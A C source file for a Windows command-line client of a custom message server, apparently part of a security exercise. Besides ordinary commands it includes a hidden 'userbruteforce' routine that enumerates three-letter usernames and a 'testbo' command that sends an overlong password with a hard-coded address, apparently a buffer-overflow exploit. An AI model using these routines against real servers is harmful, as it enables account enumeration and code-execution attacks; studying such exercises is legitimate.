#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "..\utils\utils.h"


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN  4096
#define DEFAULT_PORT    "44011"

char gDefaultServer[10] = "127.0.0.1";

void
PrintHelp(
    void
    )
{
    printf("Available commands (those marked with * are client side commands):\n");
    printf("  - user <username>   - Log in with given user name\n");
    printf("  - pass <password>   - Enter the password for the given user\n");
    printf("  - logoff            - Log out\n");
    printf("  - info <N>          - Retrieve information about the user. N means\n");
    printf("                        how many fields to retrieve:\n");
    printf("                        1 - username\n");
    printf("                        2 - username and full name\n");
    printf("                        3 - username, full name and email\n");
    printf("  - list              - Get list of messages\n");
    printf("  - get <n>           - Retrieve the message with the given index\n");
    printf("  - put <file>        - Put a message file in current user's folder\n");
    printf("  - avail             - Ask the server which are the available commands,\n");
    printf("                        considering the connection state\n");
    printf("  - exit              - Notice the server and exit (recommended)\n");
    printf("  * srvlogin          - Display server login username\n");
    printf("  * quit              - Quit without noticing the server\n");
    printf("  * help              - Display this help\n");
}

BOOLEAN
TryUserName(
    SOCKET ConnectSocket,
    char *Username,
    BOOLEAN *Valid
    )
{
    int iResult;
    char recvbuf[64];
    char sendbuf[64] = "user ";

    strcat_s(sendbuf, 64, Username);

    *Valid = FALSE;

    // Send buffer
    iResult = send( ConnectSocket, sendbuf, (int)strlen(sendbuf), 0 );
    if (iResult == SOCKET_ERROR)
    {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return FALSE;
    }

    //printf("Bytes Sent: %ld\n", iResult);

    // Receive from server
    iResult = recv(ConnectSocket, recvbuf, 64, 0);
    if ( iResult > 0 )
    {
        //printf("Bytes received: %d\n", iResult);

        recvbuf[iResult] = 0;

        //printf("%s: %s\n", Username, recvbuf);

        if (0 == _stricmp(recvbuf, "[OK] User is valid, provide password."))
        {
            ///printf("User: %s is correct!\n", Username);
            *Valid = TRUE;
            return TRUE;
        }
    }
    else
    {
        return FALSE;
    }

    return TRUE;
}

#define LETTERS     ((int)('z' + 1 - 'a'))

BOOLEAN
GenerateUser(
    char *User,
    int Len,
    int Index
    )
{
    int i;
    for (i = 0; i < Len; i++)
    {
        User[i] = 'a';
    }
    User[i] = 0;

    i = Len - 1;
    while (i >= 0)
    {
        char x = Index % LETTERS;
        Index /= LETTERS;

        User[i] += x;

        i--;
    }

    if (Index > 0)
    {
        printf("Din index a ramas %d\n", Index);
        return FALSE;
    }

    //printf(": %s\n", User);
    return TRUE;
}


BOOLEAN
UserBruteForce(
    SOCKET Socket
    )
{
    BOOLEAN valid = FALSE;
    char x[5];
    //BOOLEAN res;
    int i;

    UNREFERENCED_PARAMETER(Socket);
    
    /*if (!TryUserName(Socket, "cucu", &valid))
    {
        return FALSE;
    }*/
    for (i = 0; i < 500000; i++)    // 456976
    {
        if (!GenerateUser(x, 3, i))
        {
            printf("%d\n", i);
            break;
        }
        //printf(">> %s\n", x);

        if (!TryUserName(Socket, x, &valid))
        {
            break;
        }

        if (valid)
        {
            printf("User: %s is valid!\n", x);
        }
    }

    return TRUE;
}


int __cdecl main(int argc, char **argv) 
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    int cmd = 1;
    char *serveraddr = NULL;

    /*
    char aaa[10] = "";
    int aa = 9;
    int a = sscanf_s(aaa, "%d", &aa);
    printf("ret = %d (number = %d)\n", a, aa);
    //*/
    
    // Validate the parameters
    if (argc == 2)
    {
        serveraddr = argv[1];
    }
    else
    {
        serveraddr = gDefaultServer;
        printf("Using default server: 127.0.0.1\n");
    }

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    printf("Connected to server (%s:%s). Enter commands:\n", serveraddr, DEFAULT_PORT);

    do {
        char input[DEFAULT_BUFLEN];
        
        // Accepting commands
        printf("> ");
        fgets(input, DEFAULT_BUFLEN, stdin);
        if (strlen(input) == 1)
        {
            continue;
        }

        // Remove CRLF
        input[strlen(input) - 1] = 0;

        //
        // Verify client side commands
        //
        if (0 == _stricmp(input, "quit"))
        {
            // EXIT
            printf("Quitting without noticing the server...\n");
            cmd = 0;    // not needed
            break;
        }
        else if (0 == _stricmp(input, "help"))
        {
            PrintHelp();
            cmd = 1;
            continue;
        }
        else if (0 == _stricmp(input, "userbruteforce"))
        {
            if (UserBruteForce(ConnectSocket))
            {
                cmd = 1;
            }
            else
            {
                cmd = 0;
            }
            continue;
        }
        else if (0 == _strnicmp(input, "put", 3))
        {
            char *filepath = input;
            FILE *f = NULL;
            int fileLen = 0, totalLen = 0, headerLen = 0;
            char* buf = NULL;

            while (*filepath != ' ') filepath++;
            filepath++;

            if (0 != fopen_s(&f, filepath, "rb"))
            {
                printf("can't open file: %s\n", filepath);
                cmd = 0;
                continue;
            }

            fseek(f, 0, SEEK_END);
            fileLen = ftell(f);
            fseek(f, 0, SEEK_SET);

            headerLen = 5 + strlen(filepath);   // 'put <file> ' + NUL ...
            totalLen = fileLen + headerLen;
            buf = malloc(totalLen + 1);
            if (NULL == buf)
            {
                printf("can't alloc %d + 5 + strlen(filepath) = %d\n", fileLen, totalLen);
                cmd = 0;
                continue;
            }

            sprintf_s(buf, totalLen, "%s %s ", "put", filepath);

            fread_s((char*)(buf + headerLen), fileLen, 1, fileLen, f);
            fclose(f);

            iResult = send( ConnectSocket, buf, totalLen, 0 );

            goto skip_send;
        }
        else if (0 == _stricmp(input, "testbo"))
        {
            char sendbuf[49] = "pass aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
            *(DWORD*)((char*)sendbuf + 45) = 0x10101450;
            iResult = send(ConnectSocket, sendbuf, 49, 0);
        }
        else
        {
            // Anything else. Send to server
            cmd = 1;
        }

        // Send buffer
        iResult = send( ConnectSocket, input, (int)strlen(input), 0 );
skip_send:
        if (iResult == SOCKET_ERROR)
        {
            printf("send failed with error: %d\n", WSAGetLastError());
            closesocket(ConnectSocket);
            WSACleanup();
            return 1;
        }

        //printf("Bytes Sent: %ld\n", iResult);

        // Receive from server
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if ( iResult > 0 )
        {
            //printf("Bytes received: %d\n", iResult);

            if (recvbuf[0] == '[')
            {
                // This is a text message

                recvbuf[iResult] = 0;

                printf("%s\n", recvbuf);

                if (0 == _stricmp(recvbuf, "[OK] Exiting."))
                {
                    printf("Server is stopping, closing connection.\n");
                    cmd = 0;
                }
            }
            else
            {
                PrintBuffer(recvbuf, iResult);
            }
        }
        else if ( iResult == 0 )
        {
            printf("Connection closed\n");
        }
        else
        {
            printf("recv failed with error: %d\n", WSAGetLastError());
        }

    } while (cmd != 0);

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR)
    {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
